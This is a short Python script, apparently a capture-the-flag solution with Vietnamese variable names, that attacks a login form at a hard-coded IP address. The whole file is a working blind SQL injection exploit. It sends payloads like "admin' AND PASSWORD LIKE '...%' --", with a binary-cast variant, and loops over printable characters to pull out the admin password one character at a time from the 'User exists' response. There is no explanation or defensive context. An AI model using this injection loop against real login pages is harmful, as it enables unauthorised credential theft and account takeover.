import requests

url = 'http://103.24.246.118:5551/echo/index.php'
myobj = {
    'username': "admin' AND PASSWORD LIKE 'TTHL{%' --",
    "login": "Submit"
    }

# x = requests.post(url, data  = myobj)

# print(x.text)

matKhauHienTai = 'TTHL{'
matKhauHienTai = ''
kyTuHienTai = ''

while kyTuHienTai != chr(127):
    for i in range(33, 128):
        # print(i, ' => ', chr(i))
        kyTuHienTai = chr(i)
        if(kyTuHienTai == '%'):
            continue
        matKhauTam = matKhauHienTai + kyTuHienTai
        myobj = {
            'username': f"admin' AND PASSWORD LIKE '{matKhauTam}%' --",
            "login": "Submit"
        }
        myobj = {
            'username': f"admin' AND cast(PASSWORD as binary) LIKE cast('{matKhauTam}%' as binary) --",
            "login": "Submit"
        }
        x = requests.post(url, data  = myobj)
        if("User exists" in x.text):
            matKhauHienTai = matKhauTam
            print(matKhauHienTai)
            break
        if(i == 127):
            print('xong')
            break